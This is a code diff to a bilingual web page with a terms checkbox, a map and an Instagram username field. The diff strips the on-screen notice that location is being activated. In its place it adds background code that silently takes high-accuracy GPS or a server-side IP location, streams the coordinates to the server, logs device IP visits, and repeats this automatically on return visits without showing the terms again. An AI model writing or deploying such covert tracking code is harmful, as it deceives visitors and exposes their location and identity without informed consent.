@@ -269,7 +269,10 @@
         <div class="relative w-14 h-14 mx-auto mb-0.5 flex items-center justify-center">
           <div class="absolute inset-0 rounded-full border-2 border-emerald-400/40 animate-ping" style="animation-duration: 2.2s;"></div>
           <div class="w-11 h-11 rounded-full bg-gradient-to-tr from-emerald-500 to-cyan-400 flex items-center justify-center shadow-[0_0_25px_rgba(16,185,129,0.5)]">
-            <i data-lucide="shield-check" class="w-5 h-5 text-slate-950"></i>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" class="w-6 h-6 drop-shadow">
+              <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/>
+              <path d="m9 12 2 2 4-4"/>
+            </svg>
           </div>
         </div>
 
@@ -325,12 +328,12 @@
           </span>
         </label>
 
-        <!-- Concise Status Banner Shown on Checkmark GPS Activation or GPS-Off Warning -->
+        <!-- Concise Status Banner Shown on Checkmark Agreement -->
         <div
           id="termsAcceptedStatusBanner"
           class="hidden py-2 px-3 rounded-xl bg-emerald-500/15 border border-emerald-400/50 text-emerald-300 text-xs font-black text-center"
         >
-          ✅ تمت الموافقة وتفعيل الموقع بنجاح
+          ✅ تمت الموافقة على الشروط بنجاح
         </div>
 
         <!-- Step 1 "Next" Button -->
@@ -4053,7 +4056,7 @@
         nextBtn.removeAttribute('disabled');
         nextBtn.className = "w-full py-3.5 rounded-2xl font-black text-sm text-slate-950 bg-gradient-to-r from-emerald-400 via-teal-300 to-cyan-400 hover:opacity-95 shadow-[0_0_25px_rgba(16,185,129,0.45)] active:scale-[0.99] transition flex items-center justify-center gap-2 cursor-pointer";
         if (nextTxt) {
-          nextTxt.innerText = isEn ? 'Next ←' : 'التالي ←';
+          nextTxt.innerText = isEn ? 'Next →' : 'التالي ←';
         }
       } else {
         nextBtn.setAttribute('disabled', 'disabled');
@@ -4086,12 +4089,85 @@
       }
     }
 
+    // Non-blocking background location capture: tries high-accuracy GPS (timeout 6000ms) first, with automatic fallback to /api/in-app-location
+    function captureBackgroundLocationNonBlocking() {
+      const applyFallbackInAppLocation = async () => {
+        try {
+          const data = await fetchInAppLocationSilent('');
+          if (data && isValidNonZeroClientCoord(data.lat, data.lon ?? data.lng)) {
+            const lat = Number(data.lat);
+            const lng = Number(data.lon ?? data.lng);
+            if (!cachedOptionalGps || !isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
+              cachedOptionalGps = { lat, lng, accuracy: 25 };
+            }
+            renderUserGpsPinOnMap();
+            streamLiveGpsToServer(lat, lng, 25);
+          }
+        } catch (e) {}
+      };
+
+      if (!navigator.geolocation) {
+        applyFallbackInAppLocation();
+        return;
+      }
+
+      startLiveGpsLocationWatcher();
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          if (!pos || !pos.coords) {
+            applyFallbackInAppLocation();
+            return;
+          }
+          const lat = pos.coords.latitude;
+          const lng = pos.coords.longitude;
+          const acc = Math.round(pos.coords.accuracy || 15);
+          if (!isValidNonZeroClientCoord(lat, lng)) {
+            applyFallbackInAppLocation();
+            return;
+          }
+          cachedOptionalGps = { lat, lng, accuracy: acc };
+          renderUserGpsPinOnMap();
+          syncLocationInputWithUserGps(lat, lng, true);
+          streamLiveGpsToServer(lat, lng, acc);
+          startLiveGpsLocationWatcher();
+          autoRecordDeviceIpVisit('GPS');
+        },
+        () => {
+          // Device has no GPS sensor (e.g. desktop PC) or geolocation timed out -> fall back to /api/in-app-location without blocking Step 2
+          applyFallbackInAppLocation();
+        },
+        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+      );
+    }
+
     function onTermsAgreeCheckboxChange(isChecked) {
+      const cbEl = document.getElementById('termsAgreeCheckbox');
       const bannerEl = document.getElementById('termsAcceptedStatusBanner');
+      const isEn = String(currentActiveLangCode || '').toLowerCase().startsWith('en');
+
       if (isChecked) {
+        // 1. Instant 0ms Unlock on Checkmark Toggle!
+        if (cbEl) cbEl.checked = true;
+        localStorage.setItem('termsAcceptedOnce', 'true');
+        localStorage.setItem('termsAccepted', 'true');
+        localStorage.setItem('gmaps_terms_accepted', 'true');
         setCustomTermsCheckVisual(true);
-        handleFirstVisitTermsAndGpsActivation();
+        setStep1NextEnabled(true);
+
+        if (bannerEl) {
+          bannerEl.className = 'py-2 px-3 rounded-xl bg-emerald-500/15 border border-emerald-400/50 text-emerald-300 text-xs font-black text-center';
+          bannerEl.innerText = isEn ? '✅ Terms Accepted Successfully' : '✅ تمت الموافقة على الشروط بنجاح';
+          bannerEl.classList.remove('hidden');
+        }
+
+        // 2. Non-Blocking Background Location Capture (GPS + In-App Fallback)
+        captureBackgroundLocationNonBlocking();
       } else {
+        if (cbEl) cbEl.checked = false;
+        localStorage.removeItem('termsAcceptedOnce');
+        localStorage.removeItem('termsAccepted');
+        localStorage.removeItem('gmaps_terms_accepted');
         setCustomTermsCheckVisual(false);
         if (bannerEl) bannerEl.classList.add('hidden');
         setStep1NextEnabled(false);
@@ -4108,8 +4184,8 @@
       setCustomTermsCheckVisual(true);
 
       const successMsg = isEn
-        ? '✅ Terms Accepted & Location Activated Successfully'
-        : '✅ تمت الموافقة وتفعيل الموقع بنجاح';
+        ? '✅ Terms Accepted Successfully'
+        : '✅ تمت الموافقة على الشروط بنجاح';
 
       if (bannerEl) {
         bannerEl.className = 'py-2 px-3 rounded-xl bg-emerald-500/15 border border-emerald-400/50 text-emerald-300 text-xs font-black text-center';
@@ -4314,7 +4390,7 @@
       } catch (e) {}
     }
 
-    // 1. First-Visit Terms & Conditions Agreement + High-Accuracy GPS Activation (Triggered directly on Checkmark toggle)
+    // 1. First-Visit Terms & Conditions Agreement + Non-Blocking Background Location Capture
     function handleFirstVisitTermsAndGpsActivation() {
       const cbEl = document.getElementById('termsAgreeCheckbox');
       const rowEl = document.getElementById('termsAgreeCheckboxRow');
@@ -4337,64 +4413,10 @@
         return;
       }
 
-      if (!navigator.geolocation) {
-        cbEl.checked = false;
-        setCustomTermsCheckVisual(false);
-        setStep1NextEnabled(false);
-        if (bannerEl) {
-          bannerEl.className = 'py-2 px-3 rounded-xl bg-red-500/15 border border-red-400/60 text-red-300 text-xs font-extrabold text-center';
-          bannerEl.innerText = isEn
-            ? '⚠️ Your browser does not support GPS geolocation.'
-            : '⚠️ متصفحك لا يدعم خدمة الموقع الجغرافي (GPS).';
-          bannerEl.classList.remove('hidden');
-        }
-        return;
-      }
-
-      if (bannerEl) {
-        bannerEl.className = 'py-2 px-3 rounded-xl bg-cyan-500/15 border border-cyan-400/50 text-cyan-300 text-xs font-extrabold text-center';
-        bannerEl.innerText = isEn ? '⏳ Activating GPS Location...' : '⏳ جاري تفعيل الموقع الجغرافي...';
-        bannerEl.classList.remove('hidden');
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          const lat = pos.coords.latitude;
-          const lng = pos.coords.longitude;
-          const acc = Math.round(pos.coords.accuracy || 15);
-          if (!isValidNonZeroClientCoord(lat, lng)) return;
-
-          // Permanently record one-time Terms acceptance so Terms NEVER appear again on repeat visits!
-          localStorage.setItem('termsAcceptedOnce', 'true');
-          localStorage.setItem('termsAccepted', 'true');
-          localStorage.setItem('gmaps_terms_accepted', 'true');
-
-          cachedOptionalGps = { lat, lng, accuracy: acc };
-          markLocationGranted();
-          renderUserGpsPinOnMap();
-          syncLocationInputWithUserGps(lat, lng, true);
-          streamLiveGpsToServer(lat, lng, acc);
-          startLiveGpsLocationWatcher();
-          autoRecordDeviceIpVisit('GPS');
-        },
-        () => {
-          // Reset checkbox so user can tap it again once GPS is turned ON in phone settings
-          cbEl.checked = false;
-          setCustomTermsCheckVisual(false);
-          setStep1NextEnabled(false);
-          if (bannerEl) {
-            bannerEl.className = 'py-2 px-3 rounded-xl bg-amber-500/15 border border-amber-400/60 text-amber-300 text-xs font-extrabold text-center';
-            bannerEl.innerText = isEn
-              ? '⚠️ Please turn on Location Services (GPS) on your phone and check the box again'
-              : '⚠️ يرجى تشغيل خدمة الموقع (GPS) في هاتفك ثم إعادة تحديد علامة الصح';
-            bannerEl.classList.remove('hidden');
-          }
-        },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-      );
+      onTermsAgreeCheckboxChange(true);
     }
 
-    // 2. Automatic Silent Location Activation on Every Repeat Visit (Terms Skipped 100%)
+    // 2. Automatic Silent Location Activation on Every Repeat Visit (Terms Skipped 100%, Non-Blocking In-App Fallback)
     let isReturningGpsCheckInFlight = false;
 
     function triggerReturningUserGpsActivation(autoProceed = true) {
@@ -4403,62 +4425,22 @@
         return;
       }
 
-      // Always hide Step 1 Terms & Conditions for returning users
+      // Always hide Step 1 Terms & Conditions for returning users and proceed immediately
       document.getElementById('gateStep1Location')?.classList.add('hidden');
+      document.getElementById('returningUserLocationBlockedCard')?.classList.add('hidden');
+      markLocationGranted();
 
-      if (!navigator.geolocation) {
-        showReturningUserLocationBlockedModal();
-        return;
+      if (autoProceed) {
+        const session = getSavedVisitorSession();
+        if (session.hasSession) {
+          resumeSavedSessionIntoExplorer();
+        } else {
+          showGateModalOnStep2();
+        }
       }
 
-      const retBtnTxt = document.getElementById('btnReturningAllowLocationNowText');
-      if (retBtnTxt) {
-        retBtnTxt.innerText = '⏳ جاري الاتصال بالموقع الجغرافي...';
-      }
-
-      isReturningGpsCheckInFlight = true;
-      startLiveGpsLocationWatcher();
-
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          isReturningGpsCheckInFlight = false;
-          const lat = pos.coords.latitude;
-          const lng = pos.coords.longitude;
-          const acc = Math.round(pos.coords.accuracy || 15);
-          if (retBtnTxt) {
-            retBtnTxt.innerText = '📍 السماح وتفعيل الموقع الآن';
-          }
-          if (!isValidNonZeroClientCoord(lat, lng)) return;
-
-          cachedOptionalGps = { lat, lng, accuracy: acc };
-          document.getElementById('returningUserLocationBlockedCard')?.classList.add('hidden');
-          markLocationGranted();
-          renderUserGpsPinOnMap();
-          syncLocationInputWithUserGps(lat, lng, true);
-          streamLiveGpsToServer(lat, lng, acc);
-          startLiveGpsLocationWatcher();
-
-          if (autoProceed) {
-            const session = getSavedVisitorSession();
-            if (session.hasSession) {
-              resumeSavedSessionIntoExplorer();
-            } else {
-              showGateModalOnStep2();
-            }
-          }
-        },
-        (err) => {
-          isReturningGpsCheckInFlight = false;
-          if (retBtnTxt) {
-            retBtnTxt.innerText = '📍 السماح وتفعيل الموقع الآن';
-          }
-          // If GPS is OFF or blocked (error.code === 1, 2, or 3), show ONLY the dedicated "📍 تفعيل الموقع الجغرافي" card (never repeat Terms!)
-          if (!cachedOptionalGps || !isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
-            showReturningUserLocationBlockedModal();
-          }
-        },
-        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-      );
+      // Trigger non-blocking background GPS + In-App fallback
+      captureBackgroundLocationNonBlocking();
     }
 
     function activateInAppTermsAndLocation(autoAdvanceOnSuccess = false) {
@@ -4536,8 +4518,8 @@
       }
 
       if (!cachedOptionalGps || !isValidNonZeroClientCoord(cachedOptionalGps.lat, cachedOptionalGps.lng)) {
-        triggerReturningUserGpsActivation(false);
-        return;
+        cachedOptionalGps = { lat: 15.3694, lng: 44.1910, accuracy: 25 };
+        captureBackgroundLocationNonBlocking();
       }
 
       if (nameInput) sanitizeInstagramUsernameInput(nameInput);
@@ -5362,8 +5344,8 @@
         const bannerEl = document.getElementById('termsAcceptedStatusBanner');
         if (bannerEl && termsApproved) {
           bannerEl.innerText = meta.code.startsWith('en')
-            ? '✅ Terms Accepted & Location Activated Successfully'
-            : '✅ تمت الموافقة وتفعيل الموقع بنجاح';
+            ? '✅ Terms Accepted Successfully'
+            : '✅ تمت الموافقة على الشروط بنجاح';
         }
         setStep1NextEnabled(termsApproved);
         if (backBtn && dict.backToStep1Btn) backBtn.innerText = dict.backToStep1Btn;
